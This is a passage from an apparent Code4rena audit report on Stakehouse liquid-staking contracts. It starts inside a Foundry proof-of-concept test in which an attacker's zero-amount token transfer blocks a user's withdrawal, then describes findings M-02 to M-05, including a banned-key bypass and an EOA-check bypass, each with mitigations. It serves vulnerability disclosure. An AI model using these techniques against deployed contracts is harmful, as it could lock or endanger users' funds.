vm.startPrank(hacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(savETHUser);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Validate withdrawDETH will revert  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.expectRevert(&quot;Too new&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>To run the POC execute:\n<code>yarn test -m \"PreventWithdraw\" -v</code></p>\n<p>Expected output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testPreventWithdraw() (gas: 3132637)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 9.25ms</span></span></code></pre>\n<p>To run with full trace, execute: <code>yarn test -m \"PreventWithdraw\" -vvvv</code></p>\n<h3 id=\"tools-used-13\" style=\"position:relative;\"><a href=\"#tools-used-13\" aria-label=\"tools used 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Make sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49#issuecomment-1329524394\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-02-rotating-lptokens-to-banned-bls-public-key\" style=\"position:relative;\"><a href=\"#m-02-rotating-lptokens-to-banned-bls-public-key\" aria-label=\"m 02 rotating lptokens to banned bls public key permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64\">[M-02] Rotating <code>LPTokens</code> to banned BLS public key</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64\">HE1M</a></em></p>\n<p>It is possible to rotate <code>LPTokens</code> to a banned BLS public key. This is not a safe action, because it can result in insolvency of the project (specially if the banned BLS public key was malicious).</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a user deposits ETH for staking by calling <code>depositETHForStaking</code>, the manager checks whether the provided BLS public key is banned or not.<br>\n<code>require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");</code><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L113\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L113</a></p>\n<p>If it is not banned the <code>LPToken</code> related to that BLS public key will be minted to the caller, so the number of <code>LPToken</code> related to that BLS public key will be increased.<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/liquid-staking/ETHPoolLPFactory.sol#L125\">https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/liquid-staking/ETHPoolLPFactory.sol#L125</a></p>\n<p>If it is banned, it will not be possible to stake to this BLS public key, so the number of <code>LPToken</code> will not be increased. But the issue is that it is still possible to increase the <code>LPToken</code> of this BLS public key through rotating <code>LPToken</code>.</p>\n<p>In other words, a malicious user can call <code>rotateLPTokens</code>, so that the <code>_oldLPToken</code> will be migrated to <code>_newLPToken</code> which is equal to the <code>LPToken</code> related to the banned BLS public key.</p>\n<p>In summary, the vulnerability is that during rorating <code>LPTokens</code>, it is not checked that the <code>_newLPToken</code> is related to a banned BLS public key or not.</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The following line should be added to function <code>rotateLPTokens(...)</code>:<br>\n<code>require(liquidStakingNetworkManager.isBLSPublicKeyBanned(blsPublicKeyOfNewKnot ) == false, \"BLS public key is banned or not a part of LSD network\");</code><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64#issuecomment-1329521931\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-03-giant-pools-cannot-receive-eth-from-vaults\" style=\"position:relative;\"><a href=\"#m-03-giant-pools-cannot-receive-eth-from-vaults\" aria-label=\"m 03 giant pools cannot receive eth from vaults permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74\">[M-03] Giant pools cannot receive ETH from vaults</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/372\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/293\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/183\">hihen</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/119\">koxuan</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126</a></p>\n<p>Both giant pools are affected:</p>\n<ol>\n<li>GiantSavETHVaultPool</li>\n<li>bringUnusedETHBackIntoGiantPool</li>\n</ol>\n<p>The giant pools have a <code>bringUnusedETHBackIntoGiantPool</code> function that calls the vaults to send back any unused ETH.\nCurrently, any call to this function will revert.<br>\nUnused ETH will not be sent to the giant pools and will stay in the vaults.</p>\n<p>This causes an insolvency issue when many users want to withdraw ETH and there is not enough liquidity inside the giant pools.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>bringUnusedETHBackIntoGiantPool</code> calls the vaults to receive ETH:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function bringUnusedETHBackIntoGiantPool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] calldata _savETHVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[][] calldata _lpTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[][] calldata _amounts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 numOfVaults = _savETHVaults.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults &gt; 0, &quot;Empty arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _lpTokens.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _amounts.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i; i &lt; numOfVaults; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            SavETHVault vault = SavETHVault(_savETHVaults[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            for (uint256 j; j &lt; _lpTokens[i].length; ++j) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    &quot;ETH is either staked or derivatives minted&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vault.burnLPTokens(_lpTokens[i], _amounts[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>the vaults go through a process of burning the <code>_lpTokens</code> and sending the caller giant pool ETH.</p>\n<p><code>burnLPToken</code><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /// .....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool result,) = msg.sender.call{value: _amount}(&quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // .....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Giant pools do not have a <code>fallback</code> or <code>receive</code> function. ETH cannot be sent to them</p>\n<p>Additionally, there is no accounting of <code>idleETH</code>, which should be increased with the received ETH in order to facilitate withdraws</p>\n<h3 id=\"tools-used-14\" style=\"position:relative;\"><a href=\"#tools-used-14\" aria-label=\"tools used 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Add a <code>fallback</code> or <code>receive</code> function to the pools.</li>\n<li><code>idleETH</code> should be increased with the received ETH</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74#issuecomment-1329518912\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-giantpool-should-not-check-eth-amount-on-withdrawal\" style=\"position:relative;\"><a href=\"#m-04-giantpool-should-not-check-eth-amount-on-withdrawal\" aria-label=\"m 04 giantpool should not check eth amount on withdrawal permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92\">[M-04] GiantPool should not check ETH amount on withdrawal</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92\">aphak5010</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/406\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/257\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/170\">yixxas</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/55\">HE1M</a></em></p>\n<p>The <code>GiantPoolBase.withdrawETH</code> function requires that the amount to withdraw is at least as big as the <code>MIN_STAKING_AMOUNT</code> (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53</a>).</p>\n<p>This check does not serve any purpose and can actually cause the user problems when withdrawing his ETH.</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Bob deposits ETH into the GiantPool with the <code>GiantPoolBase.depositETH</code> function.<br>\nThe amount is equal to <code>MIN_STAKING_AMOUNT + 0.99 * MIN_STAKING_AMOUNT</code>.</li>\n<li>Bob witdraws <code>MIN_STAKING_AMOUNT</code> ETH from the GiantPool.</li>\n<li>Bob has <code>0.99 * MIN_STAKING_AMOUNT</code> ETH left in the GiantPool. This is a problem since he cannot withdraw this amount of ETH since it is smaller than <code>MIN_STAKING_AMOUNT</code>.<br>\nIn order to withdraw his funds, Bob needs to first add funds to the GiantPool such that the deposited amount is big enough for withdrawal.  However this causes extra transaction fees to be paid (loss of funds) and causes a bad user experience.</li>\n</ol>\n<h3 id=\"tools-used-15\" style=\"position:relative;\"><a href=\"#tools-used-15\" aria-label=\"tools used 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");</code> statement should just be removed. It does not serve any purpose anyway.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92#issuecomment-1329518081\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-05-adding-non-eoa-representative\" style=\"position:relative;\"><a href=\"#m-05-adding-non-eoa-representative\" aria-label=\"m 05 adding non eoa representative permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/93\">[M-05] Adding non EOA representative</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/93\">HE1M</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/448\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/444\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/261\">Jeiwan</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/187\">yixxas</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L308\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L308</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L289\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L289</a></p>\n<p>It is not allowed to add non-EOA representative to the smart wallet.<br>\nBut, this limitation can be bypassed by rotating representatives.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>During registering a node runner to LSD by creating a new smart wallet, it is checked that the <code>_eoaRepresentative</code> is an EOA or not.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">require(!Address.isContract(_eoaRepresentative), &quot;Only EOA representative permitted&quot;);</span></span></code></pre>\n<p><a 